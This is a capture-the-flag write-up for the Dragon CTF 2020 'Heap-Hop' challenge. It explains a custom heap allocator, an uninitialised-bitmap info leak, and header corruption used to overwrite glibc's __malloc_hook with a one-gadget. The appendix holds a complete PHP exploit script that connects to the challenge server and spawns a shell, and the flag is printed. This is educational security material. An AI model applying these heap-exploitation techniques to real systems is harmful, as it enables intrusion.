# Heap-Hop - Dragon CTF 2020 (Pwning, 358p, 14 solved)

## Introduction
Heap-Hop is a pwning task.

A 64-bits ELF binary is given. This binary allows a user to store and delete a
data. It is not possible to read the data previously stored.

```
    __  __                       __  __
   / / / /__  ____ _____        / / / /___  ____
  / /_/ / _ \/ __ `/ __ \______/ /_/ / __ \/ __ \
 / __  /  __/ /_/ / /_/ /_____/ __  / /_/ / /_/ /
/_/ /_/\___/\__,_/ .___/     /_/ /_/\____/ .___/
                /_/                     /_/
```

## Reverse engineering
This binary has two functions : it can allocate objects and free objects.

Objects are grouped by size in chunks that can contain up to 96 objects. The
first element of these chunks is reserved to the chunk's header.

```c
struct header {
	unsigned int  size;
	unsigned char bitmap[12];
};
```

The `bitmap` field is used to mark what blocks are in use. A chunk is freed when
its bitmap only has the first bit set (corresponding to the header).

There is a global array that keeps track of the allocated chunks.

Deleting the object with index `n = a * 96 + b * 8 + c` will clear the `c`th
bit of the `b`th character of the bitmap from the `a`th chunk.

```c
chunks[a]->bitmap[b] &= ~(1 << c);
```

## Vulnerabilities
There are two vulnerabilities in this binary : the use of uninitialized memory
during object allocation that can be turned into a memory leak, and the ability
to free a chunk header and control its metadata.

### Memory leak
When a new chunk is allocated (because no chunk of a specific size exists, or
because they are all full), its `bitmap` field will be partially set.

```c
chunks[idx]->size      = chunkSize;
chunks[idx]->bitmap[0] = 1; // bit 1 == header
// bitmap[1..11] are uninitialized!
```

### Header modification
The headers for each chunks are stored as the first element of their chunks. As
such, it is possible to free them, which will clear their allocation bit. The
next allocation in this chunk will return the address of the chunk's metadata.

## Exploitation
### Memory leak
The memory leak vulnerability can be used to leak a pointer to the libc's
`main_arena` structure.

The first step is to make a pointer overlap with the `bitmap` field.

The following sequence of actions :
```
idx = add("a" * 0x10)
add("a" * 0x20)
del(idx)

add("b" * 0x10)
```

... will result in the following memory layout :
```c
/*
0x00007f0300000010 0x00007ffff7f9ca60
0x6262626262626262 0x6262626262626262
*/

struct header h = {
	.size   = 0x10,
	.bitmap = {
		0x03, 0x7F, 0x00, 0x00,
		0x60, 0xCA, 0xF9, 0xF7, 0xFF, 0x7F, 0x00, 0x00,
	};
};
```

Each individual bit of the bitmap can be leaked by allocating objects of size
`0x10` : the ID number returned by the application will skip bits that are
already set.

The following code can be used to leak the 6 bytes that contain a libc address :
```
leak = 0xFFFFFFFF

do idx = add("a")
while idx < 8 * 4

while idx < 8 * (4 + 6):
	leak ^= 1 << (idx - 8 * 4)
	idx = add("a")
```

### Header modification
The header modification vulnerability can be used to write outside the bounds of
a chunk by using the following actions :

```
add("a") # idx = 1
add("b") # idx = 2
del(0)   # del header

add("\x00\x00\x01\x00" + "\xFF") # Create a fake header
add("c" * 0x10000)               # Allocate with new size
```

The last allocation will be allocated at address `chunk + 0x10000 * 8` with a
size of `0x010000`.

There are no data structure to corrupt on the heap. Fortunately, it is possible
to allocate a chunk whose size is big enough that the glibc allocator will
return an address from a call to `mmap`.

This map will be right before the libc. It becomes possible to overwrite
information in the libc's bss by specifying a size large enough and setting
enough bits to jump over the unwritable parts of the library.

It becomes possible to change the execution flow of the program by overwriting
`__malloc_hook` with a one gadget.

**Flag**: `DrgnS{Th4nk5_Qualys_f0r_Th3_1d34!!!!!11}`

## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php // vim: filetype=php
require_once "/mnt/ctf/tools/pwn/phplib/hexdump.php";
require_once "/mnt/ctf/tools/pwn/phplib/tubes/Process.php";
require_once "/mnt/ctf/tools/pwn/phplib/tubes/Socket.php";

const LOCAL = false;
const HOST  = "yetanotherheap.hackable.software";
//const HOST  = "172.17.0.3";
const PORT  = 1337;

const MAIN_ARENA = 0x001ec310;
const HOOK       = 0x001ebb70;
//const GADGET     = 0x000e6af1;
//const GADGET = 0x00026d48; // inf loop
//const GADGET = 0x271f0; // entry
const GADGET = 0x000e6c81; // lol im idiot

function menu(Tube $t)
{
	$t->expectLine("Menu:");
	$t->expectLine("0. Exit");
	$t->expectLine("1. Allocate object");
	$t->expectLine("2. Free object");
	$t->expectLine("");
	$t->expect("> ");
}

function add(Tube $t, $data)
{
	menu($t);
	$t->write("1\n");

	$size = strlen($data);
	$t->expect("Object size: ");
	$t->write("$size\n");

	$t->expect("Object id: ");
	$id = (int)$t->readLine();

	$t->expect("Object content: ");
	$t->write($data);

	$t->expectLine("Done.");
	return $id;
}

function del(Tube $t, $idx)
{
	menu($t);
	$t->write("2\n");

	$t->expect("Object id: ");
	$t->write("$idx\n");

	$t->expectLine("Done.");
}


printf("[*] Creating process\n");
$time = microtime(true);

if(LOCAL)
	$t = new Process("./run.sh ./heap");
else
	$t = new Socket(HOST, PORT);

$t->expectLine("    __  __                       __  __          ");
$t->expectLine("   / / / /__  ____ _____        / / / /___  ____ ");
$t->expectLine("  / /_/ / _ \/ __ `/ __ \______/ /_/ / __ \/ __ \\");
$t->expectLine(" / __  /  __/ /_/ / /_/ /_____/ __  / /_/ / /_/ /");
$t->expectLine("/_/ /_/\___/\__,_/ .___/     /_/ /_/\____/ .___/ ");
$t->expectLine("                /_/                     /_/      ");

printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");


printf("[*] Leak libc\n"); /* {{{ */
// allocate big chunk
$idx = add($t, str_repeat("a", 0x100));
assert(1 === $idx);

// guard it from being coalesced
$idx = add($t, str_repeat("b", 0x110));
assert(97 === $idx);

// free big chunk (will leak ptr to main_arena)
del($t, 1);

// allocate until bitmap[0..4] = 0xFF
$padding = str_repeat("c", 0x10);
do $idx = add($t, $padding);
while($idx < 4 * 8);

// leak main_arena
$leak = 0xFFFFFFFFFFFFFF;
while($idx < 11 * 8) {
	$leak ^= 1 << ($idx - 4 * 8);
	$idx = add($t, $padding);
}

// leak libc from main_arena offset
$libc = $leak - MAIN_ARENA;
assert(0 === ($libc & 0xFFF));
assert(0 === ($libc >> 48));
printf("[+] libc: %X\n", $libc);
printf("\n");
/* }}} */

printf("[*] Allocate mmap\n"); /* {{{ */
$idx = add($t, str_repeat("d", 0x551)); // dichotomy
assert(193 === $idx);

$mmap   = 0x7ffff7daf010;
$target = 0x7ffff7dd0000 + HOOK;
$delta  = $target - $mmap;
$size   = (int)($delta / (0x60 - 1)) & ~0x0F;
//$size   = $delta & ~0x0F;
$start  = $mmap + $size * (0x60 - 1);

// printf("Write:  %X\n", $start);
// printf("Target: %X\n", $target);
// printf("Until:  %X\n", $start + $size);


$meta   = "";
$meta  .= pack("V", $size);
$meta  .= str_repeat("\xFF", 11) . "\x7F";
//$meta  .= str_pad("\x01", 12, "\x00");
$meta   = str_pad($meta, 0x551, "\x00");

printf("[*] Corrupt chunk\n");
del($t, 192);
$idx = add($t, $meta);
assert(192 === $idx);


/* Overwrite __malloc_hook */
printf("[*] Overwrite __malloc_hook\n");
$payload  = str_repeat("A", $target - $start);
$payload .= pack("Q", $libc + GADGET);
$payload  = str_pad($payload, $size, "B");
add($t, $payload);

/* Manual add */
printf("[*] Call gadget\n");
if(LOCAL)
	fgets(STDIN);

menu($t);
$t->write("1\n");

$size = $libc + 0xc0; // PTR on NULL
$t->expect("Object size: ");
$t->write("$size\n");

printf("[!] shell\n");
$t->pipe();

dump:
printf("[!] Dumping...\n");
while($buffer = $t->read(4096)) {
	//printf("%s", hexdump($buffer));
	printf("%s\n", $buffer);
}
```
